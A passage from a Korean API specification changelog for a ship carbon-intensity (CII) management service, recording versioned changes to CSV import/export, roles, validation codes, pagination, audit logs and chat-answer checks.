옮기는 목록(`-517`·`-922`·`-924`·`-225`)에도 없다(PostgreSQL에서도 `DataError`였다). **결정은 「가 — 행 단위 부분 성공」**이며 사용자 회신(결정요청 v9 군 B 권장안 · 2026-09-17)이다 — 「나」(전체 롤백)를 고르면 이미 「가」를 하고 있는 정박 경로를 반대로 바꿔야 하고 이 절의 규약 자체가 바뀐다. `dry_run`이 같은 파일에 `imported_count 3 · errors []`로 **거짓 통과**를 주던 것은 파서가 열마다 그 컬럼의 저장 범위·길이를 보게 되어 해소됐다 — 값 때문에 저장 단계에서 죽는 행이 `dry_run`을 통과하지 않는 것이 파서의 계약이다. ⚠️ **이슈 본문이 정박 `port_name`을 300자로 적었으나 모델은 `String(200)`이다** — 한도를 옮겨 적지 않고 `Voyage.__table__`·`NotUnderwayPeriod.__table__`에서 끌어낸다. 좌표(`lat`·`lon`)는 CSV 경로에만 한도가 아예 없어 수기 API와 같은 `±90`·`±180`으로 맞췄다. 소절 신설이라 `AGENTS §4.3`에 따라 판본을 올린다 (#1190) |
| 2026-09-17 | `#1076` | **§1.9 응답 `meta`에 `needs_recalc_total` 추가** · `meta` 필드 표 신설 · `needs_recalc` 각주에 건수 규정 추가. 선박 상세의 「계산 이력」이 머리에 적는 「재계산 필요 N건」을 **화면이 받은 페이지에서 세고 있었다** — 화면은 최신 20건씩 받으므로 **21번째 행부터 낡아 있어도 「0건」이 나갔다.** 「낡은 계산이 없다」와 「아직 다 세어 보지 않았다」가 같은 모양이 되는 자리이고, 이 카드를 여는 이유(「이 배에 다시 돌려야 할 계산이 있나」)에 답하지 못했다. **필터를 따라간다** — `type`·`vessel_id`·해시 필터를 `data[]`와 똑같이 걸고 **커서만 보지 않는다**(페이지마다 값이 달라지면 화면이 그 수를 「이 선박의 낡은 계산 수」로 말할 수 없다). 화면은 이 값이 없으면 **건수를 아예 적지 않는다** — 받은 행으로 대신 세는 것이 고친 결함 그 자체다. 선택지 「부분 집계임을 화면에 명시」와 「건수 표시를 뺀다」를 두고 사용자 결정을 받았고, 기준은 **서비스 적합성**이었다(`AGENTS §4.3`상 응답 행 추가라 버전은 올리지 않는다 — 엔드포인트가 늘지 않았다) (#1076) |
| 2026-09-18 | `#673` | **v1.36 — §7.5를 CSV 계약으로 전면 재작성하고 구현 표기를 지웠다** (결정요청 v9 회신 「가」 · #444 잔여). 종전 명세는 JSON 요청 본문이었으나 항차·정박 CSV와 **같은 조작**으로 통일했다(사용자가 두 번 배우지 않게). 계약의 뼈대 — ⑴ **사무직 전용**(`§1.2` 표에 등재 · `require_office`) ⑵ **`type` 폼 필드 4종**(연도·기준선·경계·연료) ⑶ 🔴 **전부 아니면 전무** — `§8.2` 부분 성공과 정반대(`IT-IMPORT-005`). `errors[]` 모양(원본 행 번호·필드·사유)과 `dry_run` 실제와 같은 판정(#1190)만 재사용한다 ⑷ `a_decimal`은 서버가 `parse_imo_scientific`으로 계산 ⑸ `OTHER` 연료 생성 경로 포함(`effective_from` 필수 · `PRD §3.4.2`) ⑹ 응답 `imported_count`는 **적용된 행 수**(연료 갱신 포함 — 신규만 세면 「안 들어갔다」로 읽힌다). `§12` 요약표의 미구현 표기 제거는 이 문서와 라우트 대조 가드가 함께 본다 (#673) |
| 2026-09-18 | `#966` | **v1.37 — §2.3 `block_coefficient` 요청 필드·검증 규칙·예시 등재 · §2.1 선박 객체에 `block_coefficient` 키 추가 · §1.6 `CB_OUT_OF_RANGE` 등재.** CB의 출처를 「선박 제원(선택)」으로 확정(결정요청 v9 D-3 「가」) — `vessel.block_coefficient`(055)가 그 칸이며, 없으면 선종 기본값 + `CB_ESTIMATED`가 종전 계약 그대로다. 실측값이 Cform 적용 범위(`TECH_SPEC §3.3.3`) 밖이면 **거부가 아니라 경고**(`CB_OUT_OF_RANGE` — 문구는 `PRD §6.3` 확정본). 필드·경고 코드 추가라 `AGENTS §4.3`에 따라 판본을 올린다 (#966) |
| 2026-09-18 | `#989` | **§2.8 `summary`에 파생 표시 2종 신설 — `missing_gross_tonnage` · `soonest_d_entry`.** 「가장 임박한 D등급 진입」과 「GT 미기록 척수」를 **화면이 받은 페이지에서** 세다가, 첫 페이지 최대치(100)를 넘는 선대에서 101번째의 급한 배가 「가장 임박」에서 빠졌다 — `summary`를 선대 전체로 둔 `#772` 결정 3-⑤을 화면만 깨고 있었다. 값의 확정 자리를 서버로 옮기고 화면은 그리기만 한다(`#419`·`#772`와 같은 방향). 동점은 (이름, `vessel_id`)로 가른다 — `sort`와 같은 2차 키. 함께 **성능을 B안(배치 조회)으로 개편**했다 — `compute_ytd_cii`의 집계 조회 4종·진행분 3종을 `(연도, 시점)` 조합별 **배치 쿼리**로 미리 읽어 요청 캐시에 채운다(200척 실측 4,624쿼리·16.4s → 32쿼리·0.57s, 값은 동일 — `PRD §16.1` 초기 페이지 로드 p95 < 3초 충족). 단건 경로(선박 상세·데이터 점검)는 종전대로 직접 읽는다. `AGENTS §4.3`상 응답 필드 추가·각주라 버전은 올리지 않는다 (#989) |
| 2026-09-19 | `#1308` | **v1.38 — 관리자(`ADMIN`)를 더해 역할 3종으로 — 계정 관리 2경로를 사무직에서 관리자로 뗀다.** §1.2 「권한 분리」를 3종 기준으로 재작성(`require_office`는 그대로 관리자를 통과시킨다 — 상위집합) · **「최초 사무직」→「최초 관리자」**(설정 `INITIAL_OFFICE_EMAILS` → `INITIAL_ADMIN_EMAILS` · **옛 이름이 설정돼 있으면 기동 거부** — 조용히 무시하면 `#1290`과 같은 실패가 재현된다) · **「마지막 사무직」→「마지막 관리자」**(대상 역할과 무관하게 관리자 이탈을 막는다) · 「하지 않는 것」의 「셋 이상의 역할」을 「역할을 3종보다 더 세분화하는 것」으로 정정 · **「사무직 전용 경로」 표에서 `GET /auth/users`·`PATCH /auth/users/{user_id}/role` 2행을 빼고 새 「관리자 전용 경로」 표로 옮겼다**(`require_admin` 신설 · `tests/test_roles_db.py`가 두 표 모두 소스와 대조) · 인증 엔드포인트 표·§12 요약표의 두 경로 인증 표기를 **관리자**로 · §1.4 `FORBIDDEN_ROLE` 설명을 경계별 두 문구로. 역할 모델 구조 변경이라 `AGENTS §4.3`에 따라 판본을 올린다 (#1301) |
| 2026-09-20 | `#1311` | §6.1 `parameters_used` v2 각주 끝에 **스키마 정본이 `TECH_SPEC §5.2.1.2`**임을 적었다 — v2가 이 각주에만 있고 상위 정본 `TECH_SPEC §5.2.1`은 v1 예시뿐이라 우선순위(`AGENTS §3.1`)가 뒤집혀 있었다. 각주 보강이라 `AGENTS §4.3`상 버전은 올리지 않는다 (#1306) |
| 2026-09-20 | `#1317` | **v1.39 — §2.3 `call_sign` 요청 필드·검증 규칙·예시 등재 · §2.1 선박 객체에 `call_sign` 키 추가 · §2.4 「빈 문자열은 안 바꾼다」 각주 · §11 `VAL-011` 등재**(#1197 A단계). 공공데이터 교차 대조의 키다 — `해양수산부_선박운항정보`가 IMO가 아니라 호출부호로 질의한다(`PRD §15.1` `[#1197]` 각주). 서버가 strip · upper로 접어 저장하므로 `hlxq`·`HLXQ` 두 키로 갈리지 않는다. 형식(ITU RR No.19.55 · 4~7자)과 「앞 두 글자 모두 숫자 불가」(No.19.50)를 422로 돌려주고, 문구는 한국어 정본 문구다(`§1.3.2`). B단계(제공자 계약·응답 파싱)는 공공데이터포털 인증키가 온 뒤라 이 판에 없다. 요청 필드·객체 키 추가라 #966(v1.37)과 같은 기준으로 버전을 올린다 (#1197) |
| 2026-09-20 | `#1318` | **v1.40 — §8.1·§8.5 CSV 수식 주입 방어를 「모든 셀」에서 「사용자 입력을 반출하는 셀과 라벨」로 좁히고, 수치 열은 렌더러가 숫자로 직렬화함을 규정.** 서버가 `Decimal`에서 만든 음수는 주입 벡터가 아닌데 종전 규정은 `-12.5`도 `'-12.5`로 만들어 스프레드시트가 **문자열로** 읽게 했다 — 지금 열들은 CHECK 제약상 음수가 없어 잠재형이지만 증감 열이 생기는 순간 열 전체가 문자열이 된다. 수치 열인지는 **열 선언으로만**(`TableSection.kinds` · `data_export.NUMERIC_COLUMNS`) 정하고 값 모양은 보지 않는다 — 종전 각주의 「판정기 자체가 취약점」은 그대로 유효하다. 선언된 열에 숫자 문법 밖의 값이 오면 문자열 규칙으로 되돌아간다(fail-closed — 수치 열에 `—`가 실제로 실리므로 `ValueError`로 세우지 않는다). §8.1 「값의 표기」 수치 행에 음수 표기를 보탰다. PDF·HTML과 `§8.2` 가져오기 방어는 무변경. 방어 규칙의 범위 변경이라 `AGENTS §4.3`에 따라 판본을 올린다 (#1247) |
| 2026-09-20 | `#1319` | **v1.41 — §3.3 `planned_distance_source` 요청 필드·각주 등재 · §3.1 항차 객체에 `planned_distance_source` 키 추가 · §3.4 「거리를 바꾸면서 출처를 생략하면 `null`로 돌아간다」 각주**(#1052 ⓷ 후속 · 마이그레이션 059). `PRD §15.2`의 「좌표 기반 추정 거리」 표시가 저장된 항차에서는 불가능했다 — 거리 출처가 값으로 없었다. 값은 `USER_INPUT`·`COORDINATE_ESTIMATE` 둘이고 **생략은 `null` = 「모른다」**다(서버는 호출자가 숫자를 어떻게 얻었는지 모르므로 직접 입력으로도 적지 않는다). 화면은 항상 보내고, CSV 가져오기(`§8.2`)는 `USER_INPUT`, 시나리오 채택(`§5.2`)은 `null`이다. 거리가 바뀌면 옛 출처를 새 숫자에 남기지 않는다 — 직접 고친 값에 「추정」이 남는 것이 `PRD §0.3`이 금하는 거짓말이다. 요청 필드·객체 키 추가라 #966(v1.37)·#1197(v1.39)과 같은 기준으로 버전을 올린다 (#1256) |
| 2026-09-20 | `#1361` | §6.3 응답에 **값 선택 규칙 각주** 추가 — `distance_nm`·`fuel_uses[].fuel_ton`은 「그 실행의 계산이 실제로 쓴 값」이고, `INCLUDE_AS_ACTUAL` 행은 실적 우선(`PRD §8.3`), **`INCLUDE_AS_PLAN` 행은 계획값만**. 종전 명세는 어느 벌을 싣는지 적지 않았고(`DB_SCHEMA §2.7` 각주가 「실적이 있으면 실적」 한 규칙만 적었다) 구현은 모든 행에 그 한 규칙을 적용해, `§3.6`이 허용하는 「항해 중 실적 일부를 넣은 진행(PLAN) 항차」가 **계산에 쓰지 않은 값**으로 「이 실행에 쓴 항차」에 나갔다 — 재현성 근거 화면이 거짓 근거였다. 구현(`services/annual_simulation.py` `_snapshot_voyage_view`)을 계산(`_inputs_from_snapshot`)의 `kind` 분기에 맞췄고 `tests/test_annual_simulation_read_db.py`가 응답의 `planned_W_capacity_nm`·`planned_M_gco2`와 목록의 PLAN 행을 대조한다. 필드·모양은 그대로이고 각주 보강이라 `AGENTS §4.3`상 버전은 올리지 않는다 (#1337) |
| 2026-09-20 | `#1385` | **v1.42 — §4.1 응답에 `rating_boundary_cii` 추가 (`#1371`).** 등급 경계 CII 4종을 **서버가 싣는다** — 종전에는 화면이 `required_cii`(표시용 6자리 문자열)를 float로 바꿔 d-vector를 곱하고 그 곱을 다시 3자리로 반올림해, **이중 반올림**으로 411,120건 중 **87건**에서 서버와 끝자리가 갈렸다(예: 서버 `1.645` vs 화면 `1.646`). `PRD §9.3` 「내부 계산값은 화면 표시 반올림값을 다시 사용하지 않는다」·`TECH_SPEC [ORACLE-S-2]`가 막는 자리다. 값은 `determine_rating`이 Layer 1 컨텍스트 안에서 낸 것이며 자릿수는 `attained_cii`·`required_cii`와 같은 **6자리**다(셋이 같은 축이라 나란히 놓으려면 같아야 한다). **등급 판정은 종전대로 서버가 하므로 등급이 바뀌는 변경이 아니다** — 화면에 적히는 경계 숫자만 서버와 일치하게 된다. 화면 표기 자릿수(3자리)도 그대로다. 새 필드라 `AGENTS §4.3`상 버전을 올린다 (#1371) |
| 2026-09-20 | `#1392` | **§1.4 두 줄을 실제 동작에 맞춤.** ⑴ **JSON 파싱 오류·잘못된 Content-Type이 400이 아니라 422**다 — 같은 문서 `§1.3.2`는 이미 422로 서술했고 표 쪽만 낡아 있었다. 코드에 `BAD_REQUEST`를 직접 raise하는 자리는 0건이며 그 코드는 **프레임워크가 낸 400을 변환할 때**(`#183`)만 쓰이므로, 400 행에 그 사실을 적었다. ⑵ **`CSRF_ERROR`의 「화면이 토큰을 다시 실어 재시도한다」가 성립하지 않는다** — `csrf` 쿠키는 `_attach_session_cookies`에서만 나오고 그 함수는 **세션을 발급하는 두 자리**(로그인·가입)에서만 불린다. 즉 토큰을 다시 받을 경로가 없어 화면을 고쳐도 같은 답이며, 그 세션으로는 **다시 로그인**해야 한다. 규정을 지우지 않고 **왜 성립하지 않는지**를 적었다 — 지우기만 하면 다음 사람이 같은 규정을 다시 쓴다. 가드는 `tests/test_auth_failure_paths.py`·`tests/test_validation_messages.py`가 갖는다. `AGENTS §4.3`상 값 정정이라 버전은 올리지 않는다 (#1366) |
| 2026-09-20 | `#1394` | §3.3에 **문자열 길이 상한 각주** 추가 — 항만명 1~200자 · `voyage_no` ~100자 · **`notes` ~1000자**. 앞 둘은 DB 컬럼 폭(`§8.2`)에서 오고 `notes`는 **`PRD §10.2` ⑵가 정한 값**인데, **코드에 상한이 없어** 요청 본문 크기가 유일한 방어였다. DB는 `TEXT`라 컬럼은 더 받지만 **받는 것과 받아도 되는 것은 다르다**. `AGENTS §4.3`상 각주 보강이라 버전은 올리지 않는다 (#1348) |
| 2026-09-20 | `#1396` | **§1.5 문장을 좁히고 예외 표 신설 · §1.9 필터 검증 각주 · §2.17.3 커서 페이지네이션** (`#1367`). ⑴ `§1.5`의 *「목록 조회 API는 커서 기반」*이 **다섯 목록에서 지켜지지 않고 있었다.** 규모를 실측해 넷(샘플 항만 **43건 고정** · 샘플 선박 **3건 고정** · 계정 **전부 보는 화면** · 정박 구간 **선박 1척**)을 예외 표에 적었다 — **고칠 것은 목록이 아니라 문장이었다.** ⑵ ⚠️ **감축 계획은 예외에 넣지 않고 커서를 붙였다** — `PLAN_LIST_LIMIT`(20)에서 자르는데 `has_more`도 `next_cursor`도 없어 **21번째 계획을 볼 방법이 없었고** 화면에서는 「계획이 20개뿐」과 구분되지 않았다(`#1076`이 계산 이력에서 고친 것과 같은 형태). 「자르면서 말하지 않는 것」은 예외가 아니다. ⑶ `§1.9`의 `type`·해시 필터가 **값이 틀려도 빈 목록**을 돌려주던 것을 **422**로 적었다 — 대조군인 `§2.16`의 `sort`는 처음부터 422였다. **형식 검증은 존재 검증이 아니다**(형식이 맞는 해시로 못 찾는 것은 200)도 함께 명시했다. 화면 쪽 남은 몫은 `#1395`다. `AGENTS §4.3`상 각주·행 추가라 버전은 올리지 않는다 (#1367) |
| 2026-09-20 | `#1397` | **§8.1 `type=voyages` 컬럼에 `planned_distance_source` 추가(22열 → 23열).** 화면은 `COORDINATE_ESTIMATE`에만 「좌표 기반 추정 거리」를 붙이는데(`PRD §15.2`) **내보낸 파일에는 그 축이 아예 없어 추정값과 직접 입력이 같은 모양**이었다 — 대권거리는 운하·해협을 돌아가는 실제 항로보다 짧으므로 구분되지 않는 파일을 받은 사람은 **추정값을 실측으로 읽는다**. **맨 뒤에 붙인다** — 앞 일곱 열은 `§8.2` 가져오기 필수 컬럼과 이름·순서가 같아야 하고(왕복) 가져오기는 뒤 열을 읽지 않으므로 왕복 동작은 바뀌지 않는다. `null`은 **빈 칸**이다(「모른다」이지 「직접 입력」이 아니다 · `PRD §0.3`). 가드는 `tests/test_data_export_db.py`와 `tests/test_report_export_routes_api_db.py`의 헤더 계약 검사가 갖는다. `AGENTS §4.3`상 행 추가라 버전은 올리지 않는다 (#1354) |
| 2026-09-20 | `#1398` | **§1.4 `WEATHER_FETCH_ERROR` 행과 §13.3 CORS 표를 실제에 맞췄다** (`#1347`). ⑴ 422 `WEATHER_FETCH_ERROR`는 **지금 나가지 않는다** — fallback을 거부하는 요청 옵션이 없어(`allow_fallback`·`reject_fallback`·`strict_weather` 전부 0건) 늘 200 + `WEATHER_NONE_FALLBACK`이다. `[ORACLE-C-2]`가 적은 두 경로 중 ⑵가 구현되지 않았음을 각주로 남겼다. 코드는 남겨 둔다 — 옵션이 생기면 그 자리가 그대로 쓰인다. ⑵ `§13.3` 허용 Method·Header를 명시 목록 → **`*`**(구현이 그렇다). ⚠️ **코드를 조이지 않았다**: 보안 경계는 `allow_origins`이고 그쪽은 이미 명시 목록이며, **`#1322`(클라우드 로그인 불성립)가 미해결**이라 지금 CORS 동작을 바꾸면 살아 있는 문제의 진단이 어려워진다 — 조이는 것은 `#1322`과 함께 판단할 사안이다. 종전 표의 **`Authorization`은 뺐다**(세션 쿠키 방식이라 그 헤더를 보내는 자리가 `frontend/src`에 0건). `AGENTS §4.3`상 값 정정이라 버전은 올리지 않는다 (#1347) |
| 2026-09-20 | `#1399` | **§15.1 응답에서 `tool_output_count` 제거 · §1.4 `CHAT_UNAVAILABLE` 조건 정정 · §15.4에 외부 모델 실패 행 추가** (`#1365`). ⑴ 응답에 **표에 없는 키**가 실리고 있었고 그 값은 **`len(tool_calls)`와 늘 같았다**(도구 출력과 이름이 `services/chat.py`의 같은 자리에서 분기 없이 함께 쌓인다). 같은 값을 두 이름으로 내보내면 둘이 갈릴 자리가 생기므로 **응답에서 뺐다** — 화면은 쓰지 않았다(`frontend/src` 실측 0건). `§13.4`의 「필드 제거는 v2」에 걸리지 않는다고 봤다: **v1 계약에 들어간 적이 없다.** ⑵ `§1.4`만 「`LLM_API_KEY` 미설정 **또는** 외부 모델 호출 실패」로 적어 `§15.2`·`§15.4`·구현과 어긋나 있었다 — **503은 미설정에서만** 나고(`get_provider()`), 외부 모델 실패는 **200 + `discarded: true`**다. 라우트의 `except LLMUnavailableError`는 `services/chat.py`가 상위 타입 `LLMError`를 먼저 잡아 **도달할 수 없었으므로** 지웠다 — 잡히지 않는 `except`는 그 경로가 있다고 읽히게 만든다. `AGENTS §4.3`상 값 정정이라 버전은 올리지 않는다 (#1365) |
| 2026-09-20 | `#1401` | **§2.10 시각에 시간대 필수 · `voyage_id` 검사 · 귀속 연도 UTC 명시** (`#1333`). ⑴ 종전에는 시간대 없는 시각을 받아 `PATCH`가 **500**(요청 naive ↔ DB aware 비교)이 되고 `POST`는 **서버 세션 시간대로 조용히 해석**했다 — 같은 리소스의 CSV 경로(`§8.2`)는 처음부터 시간대를 요구해 **두 입구가 다른 규칙**을 쓰고 있었다. 사용자가 고칠 수 있는 입력이므로 **422**다. ⑵ `voyage_id`가 **이 선박의 살아 있는 항차**여야 한다 — 종전에는 없는 id가 FK 위반으로 500이 되고 **다른 선박의 항차에도 붙었다**(뒤엣것은 아무 오류 없이 지나가고, 그 항차가 바뀔 때 **엉뚱한 선박의 계산**이 재계산 필요로 표시된다). 기능①이 `#817`에서 둔 것과 같은 검사이며 생성·수정 **양쪽**에 건다(`null`은 클리어이므로 통과). ⑶ 귀속 연도가 **UTC 기준**임을 각주로 못 박았다 — 이 절도 docstring도 처음부터 「UTC 연도」라 적었고 **구현만 달랐다**. `AGENTS §4.3`상 각주 보강이라 버전은 올리지 않는다 (#1333) |
| 2026-09-20 | `#1402` | **§2.3 · §3.1 · §3.3에 입력 검증 각주 — 500이 나던 자리 다섯** (`#1332`). ⑴ **없는 선박·삭제된 선박은 404**다 — 종전에는 FK 위반이 그대로 올라와 500이었고, **삭제된 선박에는 201로 항차가 생겼다**(`GET /vessels/{id}`는 404인데 이 경로는 통과해 **같은 리소스가 상태에 따라 있기도 없기도** 했다). CSV 가져오기(`§8.2`)도 같다. ⑵ **VAL-005는 `§3.3`·`§3.4`에서 409**다 — 「검증한다」고 세 곳이 적었으나 **보는 자리가 없어** seed에 없는 연도가 201로 저장됐고, 전환까지 통과한 뒤 CII 조회에서 409가 나 사용자는 서버 문제로 읽었다. ⑶ `§3.1`의 **`annual_inclusion_policy` 필터가 표에만 있었다** — 라우트가 선언하지 않은 쿼리를 FastAPI는 오류 없이 버려, 문서대로 보낸 호출자는 **필터가 걸린 줄 알고 전체 목록**을 받았다. 구현하고 `status`와 함께 **열거값도 422**로 검증한다(오타가 빈 목록으로 돌아오면 「그런 항차가 없다」와 같은 모양이 된다 — `§2.1`의 `ship_type`은 처음부터 422였다). ⑷ **없는 `default_fuel_type`은 422**다(종전 500) — 같은 절의 `ship_type`(VAL-004)과 같은 처리다. `AGENTS §4.3`상 각주 보강이라 버전은 올리지 않는다 (#1332) |
| 2026-09-20 | `#1403` | **§3.5 전환 표에 `DRAFT → CANCELLED` 추가 · 「audit log 필수」 두 전환이 실제로 기록됨을 각주로** (`#1328`). ⑴ 그 전환은 코드와 **화면**에 처음부터 있었고 이 표에만 없어 **문서를 보고 만든 쪽은 422를 기대**했다 — 화면이 이미 제공하므로 코드에서 닫는 쪽은 성립하지 않는다. ⑵ 표가 두 전환에 「audit log 필수」를 적어 두고도 **코드는 확정만 기록**했다(`TECH_SPEC §13.1`의 좁은 문장을 근거로 삼았다) — 확정을 되돌려 고친 뒤 다시 확정하면 **누가 언제 되돌렸는지**가 사라졌다. 액션 값은 `VOYAGE_TRANSITION`이며 `AGENTS §3.1`상 `PRD` > `TECH_SPEC`이라 코드와 `TECH_SPEC`을 맞췄다. `AGENTS §4.3`상 행 추가·각주 보강이라 버전은 올리지 않는다 (#1328) |
| 2026-09-20 | `#1404` | **§11 VAL 문구 표를 실제 응답에 맞추고 「틀」로 다시 씀 · §3.5 422 예시 교체** (`#1329`). ⑴ 표와 실제가 일곱 자리에서 갈려 있었고 사유는 `PRD §9.1` 대조표에 적었다. ⚠️ **CSV 가져오기(`§8.2`)도 같은 틀을 쓴다** — 종전에는 그 경로가 문구를 따로 들고 있어 **같은 값 오류가 CSV로는 「0보다 커야 합니다」, 화면 입력으로는 「계획 거리는 0.01 이상이어야 합니다」**로 나갔다(한 제품에 두 규칙이 있는 것처럼 읽힌다). ⑵ `§3.5` 422 예시가 **실제 응답이 아니었다** — 영문 필드명(`actual_fuel_ton`)과 상태 코드 원문을 문장에 넣고 `details[].rule`을 실었는데, 구현은 **한국어 한 문장에 `details`는 빈다**. `§1.3.2` 언어 규정(`#999`)과 `rule`을 넣지 않는 규약이 **그 뒤에 정해졌고 이 예시만 남아 있었다**. `AGENTS §4.3`상 값 정정이라 버전은 올리지 않는다 (#1329) |
| 2026-09-20 | `#1406` | **§1.2에 토큰 경로 상태 코드 각주 + 소요시간 범위 명시** (`#1326`). `auth_tokens.py`가 상태를 직접 적어 **`VALIDATION_ERROR`에 400**(`§1.4`는 422) · **메일 실패에 502**(`§1.4`에 502 행이 없고 `INTERNAL_ERROR`는 500)를 냈다 — 같은 코드에 다른 상태가 붙는 자리가 그 파일 하나뿐이었고 `errors.ERROR_HTTP_STATUS`와도 어긋났다. **값만 고치지 않고 `_error()`의 상태 인자를 없앴다** — 인자가 남아 있으면 어느 호출부가 다시 다른 값을 적는다. ⚠️ **인증 메일 재발송의 소요시간은 아직 같지 않다**는 사실도 적었다 — 발송을 백그라운드로 옮기면 **실패를 알릴 자리가 사라져** 위 정리가 무의미해지고, 계정 존재는 `signup`이 이미 알린다(`PRD §6.3` **비대칭 규정**). 후속은 `#1405`다. `AGENTS §4.3`상 각주 보강이라 버전은 올리지 않는다 (#1326) |
| 2026-09-20 | `#1408` | **§6.1 `as_of` 행 정정 — 잔여 계획은 날짜로 자르지 않는다** (`#1323`). 종전 문장(「잔여 계획은 **도착 예정 > `as_of`**인 것이 시점 전망에 남는다(상보 집합)」)이 **구멍을 만들었다**: 확정분 조회는 정책이 `INCLUDE_AS_ACTUAL`인 것만 보므로, **도착 예정이 지난 `INCLUDE_AS_PLAN` 항차**(지연된 `IN_PROGRESS` · 기한이 지난 `PLANNED`)가 **어느 쪽에도 들지 않았다** — 거리·연료가 통째로 사라지고 `remaining_voyage_count`에도 없었다(실측 연말 예상 등급 **D → C**). `collect_annual_inputs`를 기능③·실시간 ⑶·함대 감축이 공유하므로 **네 곳에서 동시에** 사라진다. **`PRD §12.2`의 `remaining_voyages` 행은 대상을 상태로 적고 날짜로 자르지 않으며 `AGENTS §3.1`상 `PRD`가 앞선다** — 두 집합을 가르는 것은 **연간 반영 정책**이다. ⚠️ **예정일이 지났다는 것은 도착했다는 뜻이 아니다** — 그 상태를 알리는 것은 `IN_PROGRESS_PAST_ETA` 경고의 몫이고(`#649`) 집계에서 빼는 근거가 아니다. ⚠️ 시드의 진행 항차 ETA가 `_rel(8)`이라 **시드를 시연 8일 이상 전에 적재하면 그대로 재현된다**. `AGENTS §4.3`상 값 정정이라 버전은 올리지 않는다 (#1323) |
| 2026-09-20 | `#1411` | **§1.6에 `IN_PROGRESS_PLANNED_DISTANCE_REACHED` 등재** (`#1321`). 진행 중 항차의 누적 거리가 **계획 거리에 닿아 잘렸을 때** 붙는다. 자르기만 하고 알리지 않으면 사용자는 값이 멈춘 것을 「항차가 끝났나」로 읽는다 — `#649`가 `IN_PROGRESS_PAST_ETA`를 둔 것과 같은 이유다. ⚠️ **그 코드를 재사용하지 않는다**: 계획 거리는 예정일보다 **먼저** 찰 수 있어(시연 시드 3.6일) 한 코드로 묶으면 화면이 「도착 예정일이 지났습니다」라고 **거짓말을 한다**. 사슬은 `tests/test_warning_codes_sync.py`(코드 ↔ `§1.6` ↔ `TECH_SPEC §12.3`)와 `warningMessage.sync.test.ts`(화면)가 검사한다. `AGENTS §4.3`상 소규모 행 추가라 버전은 올리지 않는다 (#1321) |
| 2026-09-20 | `#1412` | **§15.2 폐기 조건에 백분율 행 · §15.3에 `next_boundary_gap` 표기 규정 · §15.4에 도구 인자 오류 행 추가** (`#1334`). ⑵ 화면은 `formatPercent`로 `1.2%`를 쓰는데 도구가 비율만 줘서 **모델이 화면과 같은 표기로 답하면 폐기됐다** — 도구가 `"0.012345 (1.2%)"`로 두 표기를 한 값에 담는다. **키를 늘리지 않는 것은 화이트리스트가 이름을 검사하기 때문**이다(같은 값이 두 이름으로 남는다). ⑶ 한 자리 수가 무조건 무시돼 **지어낸 「7%」가 통과**했고(실측) 그 답이 「검증된 답」으로 저장돼 다음 턴에 다시 허용됐다 — `%`가 붙으면 한 자리라도 대조한다(목록을 통째로 없애면 「3가지」·「2026년」이 폐기된다). ⑴ 도구 인자가 빠지거나 「약 100」으로 오면 **턴 전체가 500**이었고 롤백으로 **방금 저장한 질문까지 사라졌다** — 봉투로 되돌려 200이다. `AGENTS §4.3`상 행 추가라 버전은 올리지 않는다 (#1334) |
| 2026-09-20 | `#1413` | **§15.6 `DELETE /chat/sessions/{session_id}` 신설 · §12 요약표 행 추가** (`#1330`). `PRD §16.3`이 삭제 요청 지원을 적는데 **엔드포인트가 없었다**(`routes/chat.py`의 라우트는 `POST /chat` 하나뿐). 성공은 **204**(지워진 대화를 돌려줄 수 없다), 내 것이 아니거나 없으면 **404** — **403이 아닌 이유**는 「있지만 네 것이 아니다」가 id를 바꿔 가며 **남의 대화 존재 여부**를 알아낼 수 있게 하기 때문이다(`§15.1` 조회와 같은 규칙). 감사는 `CHAT_DELETE`이며 **대화 내용을 적지 않는다**. 계정 전체 삭제는 `§1.2` 탈퇴가 함께 처리한다. `AGENTS §4.3`상 절 신설이나 기존 경로의 보완이라 버전은 올리지 않는다 (#1330) |
| 2026-09-20 | `#1428` | **§16 「감사 로그 조회」 신설(`GET /audit-logs`) · §1.2 사무직 전용 경로 표 · §12 요약표 행 추가** (`#1241`). `audit_log`는 **쌓이기만 하고 읽는 경로가 없었다** — 저장소에 `insert_event` 하나뿐이라 `#673`이 남긴 규정 적재 이력(누가·언제·몇 행·어느 판본)에 **제품 안에서 닿을 방법이 없었다**(`IT-AUDIT-002`). **절 번호를 16으로 뒤에 붙인 이유**는 `§15`와 같다 — `§11`~`§14`가 요약·정정 절이라 앞에 끼우면 참조가 전부 밀린다. ⚠️ **모르는 `action`은 빈 목록이 아니라 422**다 — 0건으로 답하면 사용자는 「그런 사건이 없다」로 읽는다(「없다」와 「잘못 물었다」는 다른 답이다). ⚠️ **`details`를 거르지 않는다** — 감사는 사실만 적는 자리이고(`TECH_SPEC §13.1`) 자격 증명은 애초에 들어가지 않는다. 조회에서 다시 거르면 **규칙이 두 곳**에 생기고 한쪽만 고쳐지면 「걸렀다」가 거짓이 된다. 사무직 이상인 이유는 **사용자 식별자와 IP**가 들어 있기 때문이다. 페이지네이션은 `§1.9`와 같은 keyset이며 `next_cursor`는 **다음 페이지가 있을 때만** 채운다(늘 채우면 무한 루프). `AGENTS §4.3`상 절 신설이나 기존 목록의 보완이라 버전은 올리지 않는다 (#1241) |
| 2026-09-20 | `#1429` | **§4.1 응답에 `annual_impact` 신설** — 「연간 반영 시 변화」 (`#1338`). `PRD §10.3` ⑨·`§10.4` 출력 표가 정한 행이 **API·화면 어디에도 없었다**(`frontend/src` 실측 0건). `§5.1`이 기능①을 **MUST**로 두므로 정본에서 빼는 쪽은 요구를 내리는 것이다. ⚠️ **항차 CII와 다른 질문에 답한다** — 항차 CII는 **이 항차 하나**를, 이 블록은 **그 배의 한 해 전체**를 본다. 데모 시드 실측에서 벌크 50,000은 **항차 `C`에 연말 `E`**, 컨테이너는 **항차 `E`에 연말 `B`**다 — **수준이 어긋나는 것이 정상**이고 화면이 둘을 같은 값으로 다루면 안 된다. **조립을 새로 만들지 않는다** — `§2.14` ⑶·기능③과 같은 함수를 부른다(`#798`이 조립을 둘로 둬 7.654488 vs 8.971119를 냈다). 기초 자료가 없으면 **`null`**이고(0과 비교한 숫자를 지어내지 않는다) **이 블록의 실패가 항차 CII 계산을 막지 않는다**(`PRD §16.2`). ⚠️ **`input_hash`·`parameter_hash`는 바뀌지 않는다** — 파생 출력이지 입력이 아니다. `AGENTS §4.3`상 필드 추가라 버전은 올리지 않는다 (#1338) |
